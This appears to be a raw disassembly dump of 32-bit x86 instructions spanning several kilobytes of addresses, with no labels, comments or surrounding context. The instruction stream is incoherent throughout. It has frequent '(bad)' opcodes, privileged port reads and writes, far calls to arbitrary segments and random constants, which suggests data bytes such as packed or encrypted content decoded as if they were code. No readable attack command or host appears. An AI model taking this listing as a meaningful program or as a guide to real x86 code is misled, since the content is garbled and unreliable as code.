  420346:	and    al,0x76
  420348:	lea    edi,[edx+eiz*8-0x1869994]
  42034f:	ret    0x652a
  420352:	das    
  420353:	cdq    
  420354:	mov    ds:0xc4f11d8,al
  420359:	sub    eax,0x9b731d76
  42035e:	scas   eax,DWORD PTR es:[edi]
  42035f:	ror    DWORD PTR [edx+edx*4-0xa],cl
  420363:	call   0xc0c9:0xd1fc7edd
  42036a:	in     eax,dx
  42036b:	lods   al,BYTE PTR ds:[esi]
  42036c:	xor    al,0x5e
  42036e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42036f:	fld    DWORD PTR [eax-0x66f43bea]
  420375:	mov    ebx,0xaca2ff7c
  42037a:	not    eax
  42037c:	aas    
  42037d:	es jo  0x420394
  420380:	shr    DWORD PTR [esi+edx*1-0x2f],cl
  420384:	cld    
  420385:	pop    es
  420386:	and    eax,0xa6e72f50
  42038b:	cmp    al,0x6
  42038d:	mov    eax,ds:0x53e4b949
  420392:	enter  0x3f51,0x4a
  420396:	pop    ecx
  420397:	(bad)  
  420398:	fcomp  QWORD PTR [ebp-0x6328fbda]
  42039e:	and    esp,DWORD PTR [esi+0x1d61d659]
  4203a4:	mov    ch,0xc4
  4203a6:	sti    
  4203a7:	fist   WORD PTR [eax+0x5]
  4203aa:	retf   0xb788
  4203ad:	xchg   esi,esp
  4203af:	or     DWORD PTR ds:0x585764aa,ecx
  4203b5:	ret    0x27d4
  4203b8:	cmp    edi,edi
  4203ba:	mov    esi,0x93db33bb
  4203bf:	out    dx,eax
  4203c0:	or     DWORD PTR [edx+0x17be7511],edx
  4203c6:	jo     0x420401
  4203c8:	bound  esp,QWORD PTR [edi]
  4203ca:	clc    
  4203cb:	in     al,dx
  4203cc:	nop
  4203cd:	mov    dh,cl
  4203cf:	test   al,0xe1
  4203d1:	or     eax,0xcced6a52
  4203d6:	jmp    0x420431
  4203d8:	and    bh,BYTE PTR [eax+0x732171b6]
  4203de:	aas    
  4203df:	call   FWORD PTR ds:[edx]
  4203e2:	cwde   
  4203e3:	lods   eax,DWORD PTR ds:[esi]
  4203e4:	mov    edi,DWORD PTR [ebp+eax*2-0x584a2716]
  4203eb:	adc    BYTE PTR [ebx+0x7dae9a51],ch
  4203f1:	in     al,0xcc
  4203f3:	jge    0x4203e4
  4203f5:	jle    0x4203e3
  4203f7:	or     DWORD PTR [esi+0x26058e63],edx
  4203fd:	shr    DWORD PTR [ecx+0x1f779c34],cl
  420403:	jae    0x420400
  420405:	dec    ecx
  420406:	mov    ebp,0xee1e26d9
  42040b:	cs loop 0x420426
  42040e:	repz dec ax
  420411:	adc    cl,bh
  420413:	or     ebx,DWORD PTR [edi]
  420415:	pop    ss
  420416:	es sub al,0x5
  420419:	rcr    bh,cl
  42041b:	sub    eax,0x2f20c678
  420420:	aad    0x2d
  420422:	outs   dx,DWORD PTR ds:[esi]
  420423:	mov    cl,0xcd
  420425:	dec    edi
  420426:	xchg   edi,eax
  420427:	pop    ebp
  420428:	push   esi
  420429:	inc    BYTE PTR [edi]
  42042b:	push   eax
  42042c:	cwde   
  42042d:	mov    esp,0xefe48cf0
  420432:	sub    DWORD PTR [ecx-0x23],edi
  420435:	mov    al,0x39
  420437:	sub    BYTE PTR [eiz*1+0x237a4c67],0x5c
  42043f:	inc    edx
  420440:	cdq    
  420441:	xor    BYTE PTR ds:0x84d2c619,dl
  420447:	mov    edi,0x2dc29ec1
  42044c:	jbe    0x420421
  42044e:	ins    DWORD PTR es:[edi],dx
  42044f:	mov    esp,DWORD PTR [esi]
  420451:	pop    ds
  420452:	sar    DWORD PTR [edx+0x70],1
  420455:	xor    al,0x33
  420457:	sbb    DWORD PTR [eax+0x6bc60d5f],eax
  42045d:	test   DWORD PTR [esi],ecx
  42045f:	sub    BYTE PTR [ecx+0x668b2cd2],0x56
  420466:	fidiv  WORD PTR ds:0xf3c3ea03
  42046c:	leave  
  42046d:	sub    BYTE PTR [ecx+0x57c98e1e],0xd6
  420474:	pop    edx
  420475:	jg     0x420442
  420477:	adc    al,0x52
  420479:	pop    eax
  42047a:	neg    DWORD PTR [ecx+0x34]
  42047d:	(bad)  
  42047e:	xor    eax,0xb8ec7db6
  420483:	je     0x42049e
  420485:	pop    edx
  420486:	repz adc ebx,eax
  420489:	sbb    bh,BYTE PTR [ebx]
  42048b:	ret    
  42048c:	mov    ds:0xc7c4d04d,al
  420491:	adc    ah,ch
  420493:	not    ecx
  420495:	or     al,BYTE PTR [esi]
  420497:	fadd   DWORD PTR [eax]
	...
  420511:	add    BYTE PTR [eax],al
  420513:	add    BYTE PTR [ebx+ecx*8],dl
  420516:	mov    bl,0x9a
  420518:	(bad)  
  420519:	cli    
  42051a:	cmp    eax,0x190968cf
  42051f:	mov    eax,DWORD PTR [esi]
  420521:	pop    edx
  420522:	pop    ebx
  420523:	out    dx,eax
  420524:	in     eax,0x9d
  420526:	add    DWORD PTR [eax],eax
  420528:	ins    BYTE PTR es:[edi],dx
  420529:	pop    es
  42052a:	add    BYTE PTR [eax],al
  42052c:	ror    BYTE PTR [ecx+esi*8+0x1a0c002a],1
  420533:	jns    0x42057f
  420535:	dec    eax
  420536:	imul   ecx,DWORD PTR [eax+esi*8+0x2f],0x41
  42053b:	les    edi,FWORD PTR [ebx-0x1e4d7b96]
  420541:	sbb    ebx,ecx
  420543:	mov    esp,esi
  420545:	jb     0x4205b8
  420547:	mov    ch,0xa3
  420549:	jns    0x420599
  42054b:	dec    ecx
  42054c:	push   0xffffff86
  42054e:	daa    
  42054f:	mov    ecx,0xd6e46c2
  420554:	aam    0xe9
  420556:	cmp    DWORD PTR [edx+0x1363dc40],esp
  42055c:	lea    ecx,[ebp+0x5340ba8a]
  420562:	aas    
  420563:	outs   dx,DWORD PTR ds:[esi]
  420564:	cmc    
  420565:	push   0x24
  420567:	hlt    
  420568:	xchg   esp,eax
  420569:	inc    ebp
  42056a:	stos   DWORD PTR es:[edi],eax
  42056b:	sbb    eax,0x645a7898
  420570:	iret   
  420571:	rcr    BYTE PTR [esi-0xa],cl
  420574:	fwait
  420575:	add    BYTE PTR [ebp+0x1dc439e3],dh
  42057b:	push   ss
  42057c:	mov    ah,0xce
  42057e:	and    eax,0x64590da
  420583:	sbb    al,0x84
  420585:	mov    ebx,0x48f6f6dd
  42058a:	je     0x4205c6
  42058c:	xchg   ebx,eax
  42058d:	aam    0x95
  42058f:	xchg   ecx,eax
  420590:	sub    edi,esi
  420592:	push   esi
  420593:	jl     0x420588
  420595:	ficom  DWORD PTR [ebx+0x45e4a3e6]
  42059b:	(bad)  
  42059c:	cdq    
  42059d:	or     ecx,DWORD PTR [edi-0x7139ba48]
  4205a3:	imul   esp,ebx,0xffffffb5
  4205a6:	shr    DWORD PTR [edx+0x75bf576f],cl
  4205ac:	rcl    BYTE PTR [edx],0xf9
  4205af:	xor    al,0x5c
  4205b1:	daa    
  4205b2:	pop    edi
  4205b3:	mov    ds:0xe05e7764,eax
  4205b8:	fild   DWORD PTR [eax]
  4205ba:	sub    BYTE PTR [ebp+0x65],dl
  4205bd:	sub    DWORD PTR [ebp-0x7d],0x5b
  4205c1:	jl     0x4205dc
  4205c3:	push   ebx
  4205c4:	popa   
  4205c5:	dec    ecx
  4205c6:	scas   eax,DWORD PTR es:[edi]
  4205c7:	sti    
  4205c8:	xor    esp,DWORD PTR [eax+0x14e61cfe]
  4205ce:	jno    0x4205ee
  4205d0:	mov    esi,DWORD PTR [ecx+ebp*8+0x7]
  4205d4:	fimul  WORD PTR ds:0xb31bb3dd
  4205da:	and    BYTE PTR [ebx+0x24],0xf1
  4205de:	mov    ebp,0xa45898ce
  4205e3:	popf   
  4205e4:	mov    ebp,0x613ef232
  4205e9:	popa   
  4205ea:	daa    
  4205eb:	fcom   DWORD PTR [ebx-0x26]
  4205ee:	(bad)  
  4205ef:	fst    DWORD PTR [edi+ebp*2-0x22bd1f3]
  4205f6:	or     esi,0x31
  4205f9:	push   edi
  4205fa:	jl     0x42065c
  4205fc:	sub    BYTE PTR [ebp+0x6a48c9b4],0xdc
  420603:	call   0xaa413dc
  420608:	ret    0x6dbb
  42060b:	sar    DWORD PTR [ebp-0x1e],cl
  42060e:	adc    DWORD PTR [esi+0x22],esi
  420611:	das    
  420612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420613:	adc    BYTE PTR [edi-0x66],bh
  420616:	adc    eax,0x272656a3
  42061b:	std    
  42061c:	pushf  
  42061d:	leave  
  42061e:	retf   
  42061f:	stos   DWORD PTR es:[edi],eax
  420620:	call   DWORD PTR [edx-0x6a62eb49]
  420626:	mov    edi,0x742fabe
  42062b:	pop    edx
  42062c:	and    ecx,ebp
  42062e:	and    BYTE PTR ss:[edx],al
  420631:	mov    edi,0xbc1c3178
  420636:	mov    edi,DWORD PTR [ebp-0x6e]
  420639:	push   gs
  42063b:	loop   0x420661
  42063d:	adc    eax,0x11b5c7d4
  420642:	mov    esi,0xe8095f15
  420647:	iret   
  420648:	pop    eax
  420649:	adc    eax,0x99f2ce9a
  42064e:	cmp    esp,DWORD PTR [eax+0x4b]
  420651:	add    al,0x31
  420653:	sbb    eax,0x661d7f0
  420658:	and    dl,BYTE PTR [ebx]
  42065a:	xchg   BYTE PTR [edx],ah
  42065c:	dec    eax
  42065d:	adc    BYTE PTR [edi],dl
  42065f:	push   ebp
  420660:	jecxz  0x42065b
  420662:	or     ebx,DWORD PTR [edx+0x6a8dd2a4]
  420668:	fidiv  WORD PTR [ebx-0x74]
  42066b:	lds    ebx,FWORD PTR [eax-0x75abca86]
  420671:	sbb    eax,DWORD PTR [eax+0x46]
  420674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420675:	call   0x3038fead
  42067a:	dec    ebx
  42067b:	inc    esi
  42067c:	jecxz  0x4206c2
  42067e:	mov    ah,0xbb
  420680:	jae    0x42068f
  420682:	ins    DWORD PTR es:[edi],dx
  420683:	sub    DWORD PTR [ecx-0x2e],0xd9212944
  42068a:	lock pop edi
  42068c:	(bad)  
  42068d:	retf   
  42068e:	push   ebp
  42068f:	and    BYTE PTR [ebx-0x788801f5],dh
  420695:	dec    esp
  420696:	je     0x420687
  420698:	xchg   edx,eax
  420699:	mov    cl,0xce
  42069b:	mov    gs,WORD PTR [eax]
  42069d:	sbb    DWORD PTR [edi+0x2b60c2e0],eax
  4206a3:	rcr    DWORD PTR [eax-0x63038e64],0x72
  4206aa:	jl     0x42065f
  4206ac:	push   eax
  4206ad:	aaa    
  4206ae:	jp     0x42070e
  4206b0:	dec    esp
  4206b1:	mov    al,ds:0x384aeb0a
  4206b6:	add    edi,esp
  4206b8:	pop    eax
  4206b9:	adc    BYTE PTR [eax-0x80],ch
  4206bc:	inc    edx
  4206bd:	jmp    0x420734
  4206bf:	sbb    DWORD PTR [edi+0x5d123f06],ecx
  4206c5:	shl    BYTE PTR ds:[esi+0x471adc5],1
  4206cc:	push   es
  4206cd:	mov    ds,eax
  4206cf:	push   ss
  4206d0:	aam    0xdd
  4206d2:	mov    BYTE PTR [ecx+ecx*1+0x6c7605c7],bh
  4206d9:	mov    bl,0xc0
  4206db:	cmp    eax,0x3add6685
  4206e0:	sbb    BYTE PTR [ebx],ah
  4206e2:	cmc    
  4206e3:	ins    BYTE PTR es:[edi],dx
  4206e4:	adc    cl,BYTE PTR [edi-0x7c]
  4206e7:	imul   ebx,esp,0xb388041d
  4206ed:	aaa    
  4206ee:	jle    0x4206db
  4206f0:	pop    edi
  4206f1:	dec    edx
  4206f2:	cmp    eax,0x839afad8
  4206f7:	fldz   
  4206f9:	lods   al,BYTE PTR ds:[esi]
  4206fa:	sbb    al,dl
  4206fc:	cmp    eax,DWORD PTR cs:[edi+0x54a490de]
  420703:	xlat   BYTE PTR ds:[ebx]
  420704:	in     al,dx
  420705:	scas   al,BYTE PTR es:[edi]
  420706:	pushf  
  420707:	push   0x60
  420709:	pop    edi
  42070a:	mov    ds:0x48161052,eax
  42070f:	rcr    DWORD PTR [ebp+0x3a],cl
  420712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420713:	sub    al,0x2b
  420715:	rol    BYTE PTR [ebx],0x35
  420718:	xchg   edx,eax
  420719:	mov    esi,0x20d71fe5
  42071e:	push   ebp
  42071f:	sub    BYTE PTR [ebx],bh
  420721:	sbb    eax,0x21e40ff9
  420726:	sbb    al,0xf5
  420728:	lods   eax,DWORD PTR ds:[esi]
  420729:	xchg   ebx,eax
  42072a:	xor    eax,0x416ffd41
  42072f:	loopne 0x4206d4
  420731:	push   esi
  420732:	imul   ecx,DWORD PTR [eax+esi*4+0x70760cee],0x30
  42073a:	jecxz  0x420715
  42073c:	xchg   ebp,eax
  42073d:	daa    
  42073e:	mov    bh,0x67
  420740:	push   eax
  420741:	stos   BYTE PTR es:[edi],al
  420742:	mov    eax,ds:0xaa84cf4f
  420747:	mov    edi,0xe5140dd5
  42074c:	outs   dx,BYTE PTR ds:[esi]
  42074d:	or     DWORD PTR [esi+0x5b3a013b],0x5059aae8
  420757:	xchg   edx,eax
  420758:	ins    DWORD PTR es:[edi],dx
  420759:	jl     0x420729
  42075b:	data16 clc 
  42075d:	mov    cs,WORD PTR [ecx-0x32db083f]
  420763:	adc    bh,cl
  420765:	cwde   
  420766:	xchg   ebp,eax
  420767:	ret    
  420768:	cmc    
  420769:	(bad)  
  42076a:	ror    BYTE PTR [edx],0x5a
  42076d:	rol    DWORD PTR [esi-0x7f01ca30],1
  420773:	xor    esi,DWORD PTR [ecx+ecx*4+0x7f]
  420777:	dec    edi
  420778:	mov    cl,dh
  42077a:	jbe    0x420746
  42077c:	lock adc bl,cl
  42077f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420780:	ror    DWORD PTR [eax+0x357fd20a],0x2d
  420787:	data16 fnstsw WORD PTR [esi]
  42078a:	push   ecx
  42078b:	mov    al,BYTE PTR [eax-0xc]
  42078e:	sbb    al,0xff
  420790:	add    BYTE PTR [edx+ebx*8],0x9f
  420794:	cmp    BYTE PTR [edx+0x88c4fb6],dh
  42079a:	jle    0x4207de
  42079c:	ret    
  42079d:	sub    dl,cl
  42079f:	bound  esi,QWORD PTR [edx]
  4207a1:	and    ch,ah
  4207a3:	xchg   edx,eax
  4207a4:	jns    0x420807
  4207a6:	sahf   
  4207a7:	bnd jnp 0x4207d1
  4207aa:	inc    ebp
  4207ab:	test   BYTE PTR [edi+0x790e50a0],bh
  4207b1:	div    DWORD PTR [ebx-0xf]
  4207b4:	icebp  
  4207b5:	push   esp
  4207b6:	push   cs
  4207b7:	xchg   edx,eax
  4207b8:	cmp    esi,DWORD PTR [edx-0x36d783b3]
  4207be:	call   0x74e014e4
  4207c3:	dec    edi
  4207c4:	in     eax,dx
  4207c5:	cmp    al,0x8a
  4207c7:	imul   esp,DWORD PTR gs:[ecx],0xffffffb2
  4207cb:	test   ebx,ebx
  4207cd:	inc    ebp
  4207ce:	and    dh,dl
  4207d0:	inc    eax
  4207d1:	fldcw  WORD PTR [ebx]
  4207d3:	clc    
  4207d4:	add    al,0x24
  4207d6:	call   0x31f29619
  4207db:	dec    ebx
  4207dc:	ss data16 jmp 0x420837
  4207e0:	xchg   edi,eax
  4207e1:	test   BYTE PTR ss:[esi],ch
  4207e4:	add    esp,DWORD PTR [ebp+0xc]
  4207e7:	xor    cl,BYTE PTR [ebx-0xc]
  4207ea:	inc    eax
  4207eb:	sub    DWORD PTR [edx-0xe97c340],edi
  4207f1:	aas    
  4207f2:	push   ecx
  4207f3:	cmp    BYTE PTR [edx],0xdc
  4207f6:	push   eax
  4207f7:	jmp    0xc593:0x5e8dab94
  4207fe:	leave  
  4207ff:	lahf   
  420800:	icebp  
  420801:	cli    
  420802:	xchg   ebp,eax
  420803:	retf   0x106e
  420806:	clc    
  420807:	ret    
  420808:	shr    BYTE PTR [eax-0x7609fcdc],cl
  42080e:	jnp    0x420852
  420810:	or     eax,0x53685bb6
  420815:	jmp    0x420831
  420817:	mov    dl,0xc8
  420819:	xchg   ecx,eax
  42081a:	pop    esi
  42081b:	in     eax,0xb
  42081d:	jmp    0x54db750e
  420822:	mov    bl,0x87
  420824:	js     0x420810
  420826:	xor    cl,ah
  420828:	sbb    ecx,DWORD PTR [ecx+0x6ae103e3]
  42082e:	cmp    DWORD PTR [ebp-0x20],0xffffffdd
  420832:	sub    DWORD PTR [edi],esi
  420834:	inc    ebp
  420835:	jp     0x42083c
  420837:	vdivsd xmm7,xmm2,xmm1
  42083b:	inc    ebp
  42083c:	add    esp,DWORD PTR [ebx+0x3425bf4b]
  420842:	out    dx,al
  420843:	mov    edx,0x736db4aa
  420848:	adc    eax,0x33843090
  42084d:	daa    
  42084e:	mov    ds:0xbde4edb8,al
  420853:	rol    cl,1
  420855:	mov    fs,WORD PTR [eax+0x5a94a521]
  42085b:	sub    ebx,DWORD PTR [ecx+ebx*2+0x36]
  42085f:	mov    dl,0x36
  420861:	cmc    
  420862:	stos   BYTE PTR es:[edi],al
  420863:	xor    dh,dl
  420865:	sbb    dl,BYTE PTR [esi-0x5b]
  420868:	xor    al,BYTE PTR [edi-0x5a]
  42086b:	not    dl
  42086d:	(bad)
  420870:	lock or cl,dl
  420873:	cmp    ah,bl
  420875:	aam    0x72
  420877:	inc    ebp
  420878:	bound  ebp,QWORD PTR [esi+eiz*4]
  42087b:	cli    
  42087c:	jno    0x420874
  42087e:	push   eax
  42087f:	sti    
  420880:	or     eax,0xa2209d5d
  420885:	ja     0x4208af
  420887:	jo     0x4208b5
  420889:	xlat   BYTE PTR ds:[ebx]
  42088a:	and    ecx,DWORD PTR [ebp+0x701a56b5]
  420890:	aaa    
  420891:	test   DWORD PTR [ecx-0x3a7864f7],edx
  420897:	ror    DWORD PTR es:[eax-0x600982a3],cl
  42089e:	into   
  42089f:	rol    BYTE PTR [ecx+ecx*1],cl
  4208a2:	sbb    al,0x19
  4208a4:	das    
  4208a5:	mov    WORD PTR [edx-0x53],?
  4208a8:	xchg   edi,eax
  4208a9:	dec    esi
  4208aa:	sub    ecx,DWORD PTR [esi+ecx*2-0x63]
  4208ae:	cmp    bl,BYTE PTR [ecx-0x13]
  4208b1:	push   ecx
  4208b2:	sbb    al,0xe2
  4208b4:	je     0x4208ad
  4208b6:	das    
  4208b7:	adc    ch,BYTE PTR [eax-0x5]
  4208ba:	inc    esp
  4208bb:	cmp    al,0xfb
  4208bd:	pop    esi
  4208be:	jg     0x42085f
  4208c0:	jg     0x420880
  4208c2:	pop    eax
  4208c3:	push   edx
  4208c4:	loope  0x420941
  4208c6:	mov    cl,0x4c
  4208c8:	ret    0x7481
  4208cb:	les    edi,FWORD PTR [edi]
  4208cd:	jmp    0xb17b:0x15709014
  4208d4:	sbb    eax,0x8b361769
  4208d9:	jbe    0x420940
  4208db:	mov    al,cl
  4208dd:	and    BYTE PTR [ecx-0x278fe4ff],dh
  4208e3:	sbb    eax,0x21fb1cfc
  4208e8:	or     BYTE PTR [ebx+ecx*4+0xc9787d1],bl
  4208ef:	pop    es
  4208f0:	mov    eax,ds:0x88b41b9c
  4208f5:	iret   
  4208f6:	into   
  4208f7:	xchg   DWORD PTR [edi],ecx
  4208f9:	and    DWORD PTR [eax+ebp*8+0xfb1e6bf],esp
  420900:	ja     0x4208b1
  420902:	xor    DWORD PTR [esi],esi
  420904:	arpl   WORD PTR [edx+ecx*4-0xe],di
  420908:	shl    DWORD PTR [ebx-0x5],1
  42090b:	ret    0xf345
  42090e:	sub    eax,0xdbce2330
  420913:	mov    ds:0xc9c96d47,eax
  420918:	adc    BYTE PTR [edi+ebp*8],dl
  42091b:	repz mov esi,0xf294c2bd
  420921:	add    edx,DWORD PTR [ecx]
  420923:	jecxz  0x42094f
  420925:	fs cdq 
  420927:	(bad)  
  420928:	in     eax,0x30
  42092a:	out    0xe9,al
  42092c:	sbb    ecx,DWORD PTR [ecx+0x7791ae8a]
  420932:	dec    eax
  420933:	std    
  420934:	sbb    eax,0x5559da14
  420939:	aas    
  42093a:	and    al,0xe9
  42093c:	and    al,0x83
  42093e:	stos   BYTE PTR es:[edi],al
  42093f:	js     0x42095a
  420941:	inc    edx
  420942:	test   BYTE PTR [ebp-0x72],cl
  420945:	rol    DWORD PTR [eax],cl
  420947:	sub    esi,ebp
  420949:	push   esi
  42094a:	daa    
  42094b:	jl     0x4209c6
  42094d:	sbb    dh,BYTE PTR [ebx]
  42094f:	mov    edi,0x84f1fb4f
  420954:	or     ch,BYTE PTR [eax]
  420956:	sbb    dh,al
  420958:	pop    es
  420959:	mov    WORD PTR [edx-0x3c5e5024],?
  42095f:	cmp    eax,0xb2117368
  420964:	das    
  420965:	pop    esi
  420966:	inc    eax
  420967:	aaa    
  420968:	fstp   QWORD PTR [ebp-0x3f]
  42096b:	pop    ecx
  42096c:	es adc bh,cl
  42096f:	rcl    DWORD PTR [ebx-0x3e],1
  420972:	cmp    cl,BYTE PTR [edi]
  420974:	pusha  
  420975:	iret   
  420976:	out    0x5c,al
  420978:	std    
  420979:	je     0x420970
  42097b:	mov    bl,0x38
  42097d:	scas   al,BYTE PTR es:[edi]
  42097e:	mov    ebx,0x167c7ea1
  420983:	fwait
  420984:	inc    esp
  420985:	hlt    
  420986:	rcl    DWORD PTR [ebx-0x9a5db7f],1
  42098c:	in     eax,dx
  42098d:	mov    gs,WORD PTR [ecx+0x25d24cff]
  420993:	fs jg  0x420919
  420996:	mov    dl,0xdc
  420998:	xchg   esp,eax
  420999:	cmp    al,0xfb
  42099b:	push   esi
  42099c:	stos   BYTE PTR es:[edi],al
  42099d:	stos   BYTE PTR es:[edi],al
  42099e:	(bad)  
  42099f:	pop    ss
  4209a0:	(bad)  [edx]
  4209a2:	sub    bl,bh
  4209a4:	dec    esi
  4209a5:	mov    es,WORD PTR [ebp-0x61b9397e]
  4209ab:	cmc    
  4209ac:	stos   BYTE PTR es:[edi],al
  4209ad:	retf   0xc08
  4209b0:	adc    al,0x2c
  4209b2:	repz sti 
  4209b4:	in     al,dx
  4209b5:	in     al,0x73
  4209b7:	adc    BYTE PTR [ebx+0x7a],bh
  4209ba:	sbb    al,0x50
  4209bc:	adc    BYTE PTR [edi+eiz*8-0x3087a5b5],dl
  4209c3:	fistp  DWORD PTR [ebx]
  4209c5:	xchg   ecx,eax
  4209c6:	push   ds
  4209c7:	xor    ebx,edi
  4209c9:	jb     0x42094c
  4209cb:	inc    ebp
  4209cc:	repnz and eax,0xfbc12fea
  4209d2:	jb     0x420a46
  4209d4:	mov    edi,0x9dd41ba9
  4209d9:	lock cmp eax,0xa29df30
  4209df:	div    edx
  4209e1:	shl    BYTE PTR [ebx+0x49752275],1
  4209e7:	jnp    0x420a27
  4209e9:	in     al,0xca
  4209eb:	lods   al,BYTE PTR ds:[esi]
  4209ec:	rcl    dl,1
  4209ee:	dec    eax
  4209ef:	xchg   edi,eax
  4209f0:	jnp    0x4209ac
  4209f2:	stc    
  4209f3:	call   DWORD PTR [ecx-0x7]
  4209f6:	pop    ebx
  4209f7:	jmp    0xdedc56b1
  4209fc:	mov    fs:0xb2de3062,al
  420a02:	sub    al,0xbe
  420a04:	stc    
  420a05:	add    dl,0x22
  420a08:	shl    BYTE PTR [eax+0x34],cl
  420a0b:	leave  
  420a0c:	(bad)  
  420a0d:	xchg   ebx,eax
  420a0e:	lahf   
  420a0f:	retf   
  420a10:	(bad)  
  420a11:	fnstsw WORD PTR [edx+eax*8]
  420a14:	inc    ebx
  420a15:	pusha  
  420a16:	cld    
  420a17:	xchg   edx,eax
  420a18:	sbb    ecx,DWORD PTR es:[ecx-0x760a329]
  420a1f:	out    dx,al
  420a20:	sar    edi,cl
  420a22:	jecxz  0x420a27
  420a24:	nop
  420a25:	push   0x325805db
  420a2a:	jne    0x420a42
  420a2c:	test   al,0xa2
  420a2e:	and    eax,0xbd66a126
  420a33:	push   es
  420a34:	mov    cl,0xd
  420a36:	sbb    DWORD PTR [edi+ebp*8-0x46e10bf7],edi
  420a3d:	sub    eax,0xae280542
  420a42:	icebp  
  420a43:	sbb    edi,DWORD PTR [edx+0x31aa3344]
  420a49:	inc    ebx
  420a4a:	cdq    
  420a4b:	adc    dl,ah
  420a4d:	imul   esp,ecx,0x6a85e144
  420a53:	mov    eax,ds:0x298ad60d
  420a58:	add    DWORD PTR [eax-0x66],esp
  420a5b:	sbb    DWORD PTR [esi-0x77a80ff2],esp
  420a61:	lods   eax,DWORD PTR ds:[esi]
  420a62:	stos   BYTE PTR es:[edi],al
  420a63:	loope  0x420a31
  420a65:	dec    ebp
  420a66:	xchg   edx,eax
  420a67:	sbb    BYTE PTR [esi+0x7e],dl
  420a6a:	enter  0xc5cb,0x4f
  420a6e:	fadd   QWORD PTR [edx*4-0x3341f98f]
  420a75:	mov    bh,0x14
  420a77:	rcr    DWORD PTR [ebx-0x259328a],cl
  420a7d:	imul   esi,DWORD PTR ds:0xf981f887,0xabf42d3b
  420a87:	adc    al,0x77
  420a89:	(bad)  
  420a8a:	jb     0x420a89
  420a8c:	repz push esp
  420a8e:	inc    esp
  420a8f:	adc    BYTE PTR [ecx+0x659151a9],0x9c
  420a96:	shl    edi,0x93
  420a99:	sub    bl,0x7c
  420a9c:	in     al,0xea
  420a9e:	mov    dl,BYTE PTR [ebp+0x1a]
  420aa1:	inc    BYTE PTR [edx]
  420aa3:	sbb    ebx,DWORD PTR [ecx-0x2b]
  420aa6:	mov    ch,0x5c
  420aa8:	in     al,0xe6
  420aaa:	or     eax,0xbaf92816
  420aaf:	loope  0x420a4e
  420ab1:	test   BYTE PTR [edi-0x1],dl
  420ab4:	adc    dl,BYTE PTR [ebx+0x21]
  420ab7:	mov    ah,0x66
  420ab9:	fcomp  QWORD PTR [edi]
  420abb:	pop    ss
  420abc:	gs mov eax,0xaeed2428
  420ac2:	pop    eax
  420ac3:	aas    
  420ac4:	ss iret 
  420ac6:	int    0x85
  420ac8:	sub    eax,0xdec878ff
  420acd:	and    al,0xe7
  420acf:	jbe    0x420a5a
  420ad1:	iret   
  420ad2:	jns    0x420b46
  420ad4:	push   cs
  420ad5:	push   eax
  420ad6:	jo     0x420a8a
  420ad8:	les    ecx,FWORD PTR [ecx+edx*4+0x3cc5b037]
  420adf:	sub    BYTE PTR [ebx+ebp*1-0x1a],bl
  420ae3:	repnz stc 
  420ae5:	mov    eax,ds:0xe19941ea
  420aea:	not    al
  420aec:	push   edi
  420aed:	sub    DWORD PTR [eax+0x64],edi
  420af0:	pop    eax
  420af1:	cmp    ah,ah
  420af3:	repnz mov edi,0xefba157c
  420af9:	test   eax,0xfdff18ce
  420afe:	sbb    edx,ecx
  420b00:	cmp    al,0xad
  420b02:	or     al,0x63
  420b04:	out    dx,eax
  420b05:	push   ss
  420b06:	mov    eax,ds:0xa65208e5
  420b0b:	std    
  420b0c:	sub    cl,BYTE PTR [ebp-0x3f]
  420b0f:	in     al,dx
  420b10:	aas    
  420b11:	(bad)  
  420b12:	cmp    eax,0x71d38639
  420b17:	push   cs
  420b18:	mov    esi,0x5e943953
  420b1d:	cs inc ecx
  420b1f:	fild   QWORD PTR [esi+esi*1]
  420b22:	push   esi
  420b23:	xchg   DWORD PTR [eax+0x0],edi
  420b26:	retf   0xf792
  420b29:	mov    edi,0x8f3ee37e
  420b2e:	cdq    
  420b2f:	mov    ebp,0xa4618aca
  420b34:	repnz outs dx,BYTE PTR ds:[esi]
  420b36:	sbb    DWORD PTR [esi+0x43],0xfffffff4
  420b3a:	fcom   QWORD PTR [ebx]
  420b3c:	aad    0x32
  420b3e:	mov    dh,0xb0
  420b40:	fwait
  420b41:	call   0xf8ed:0x73cdf950
  420b48:	jns    0x420ba5
  420b4a:	test   al,0x19
  420b4c:	push   esi
  420b4d:	fcom   DWORD PTR [edx-0x18]
  420b50:	xor    al,0x76
  420b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b53:	add    DWORD PTR [ecx-0x63470446],ebx
  420b59:	fild   WORD PTR [ecx-0x66]
  420b5c:	jne    0x420b3f
  420b5e:	and    al,0x7
  420b60:	adc    dl,BYTE PTR [edi]
  420b62:	mov    ebx,0xd3d03ac7
  420b67:	ins    BYTE PTR es:[edi],dx
  420b68:	xchg   edi,eax
  420b69:	popa   
  420b6a:	je     0x420aef
  420b6c:	dec    edi
  420b6d:	and    ebx,eax
  420b6f:	pop    edi
  420b70:	jl     0x420b36
  420b72:	lods   eax,DWORD PTR ds:[esi]
  420b73:	mov    DWORD PTR [eax],ecx
  420b75:	les    ebp,FWORD PTR fs:[ebx-0x5e]
  420b79:	and    eax,0x7d04cc1b
  420b7e:	sub    BYTE PTR [ebp+0x66],cl
  420b81:	pop    eax
  420b82:	jecxz  0x420b60
  420b84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b85:	test   al,0x9e
  420b87:	sti    
  420b88:	pop    ebx
  420b89:	fwait
  420b8a:	xchg   esi,eax
  420b8b:	mov    esp,ebx
  420b8d:	sti    
  420b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b8f:	ins    DWORD PTR es:[edi],dx
  420b90:	pop    ss
  420b91:	xchg   ebx,eax
  420b92:	dec    esi
  420b93:	cmp    dh,dl
  420b95:	mov    WORD PTR [eax+0x3be33fce],?
  420b9b:	std    
  420b9c:	inc    edi
  420b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b9e:	cmp    eax,0x8e2321c1
  420ba3:	sub    eax,0x36b3767f
  420ba8:	imul   ebx,DWORD PTR [edx],0x5d
  420bab:	push   esi
  420bac:	repnz and bl,0x7d
  420bb0:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  420bb2:	sub    BYTE PTR [edi+eax*4-0x21],dl
  420bb6:	into   
